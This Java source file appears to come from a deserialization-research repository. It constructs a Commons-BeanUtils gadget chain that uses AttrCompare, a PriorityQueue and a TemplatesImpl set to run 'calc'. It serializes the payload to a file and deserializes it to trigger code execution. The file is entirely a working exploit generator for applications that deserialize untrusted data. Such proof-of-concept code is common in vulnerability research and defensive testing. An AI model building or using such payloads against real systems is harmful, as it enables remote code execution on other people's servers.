package Seri.CBGadgets;

import Seri.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xerces.internal.dom.AttrImpl;
import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import org.apache.commons.beanutils.BeanComparator;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

import static Seri.Utils.*;

public class CBAttrCompare {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Utils.createTemplatesImpl("calc");

        AttrNSImpl attr = new AttrNSImpl();
        attr.setValues(new CoreDocumentImpl() ,"1" ,"1" ,"1");

        BeanComparator comparator = new BeanComparator(null ,new AttrCompare());

        PriorityQueue priorityQueue = new PriorityQueue(2,comparator);
        priorityQueue.add(attr);
        priorityQueue.add(attr);

        setValue(priorityQueue ,"queue" ,new Object[]{templates,templates});
        setValue(comparator,"property","outputProperties");

        serialize(priorityQueue ,"bin/CB2.bin");
        unserialize("bin/CB2.bin");
    }
}
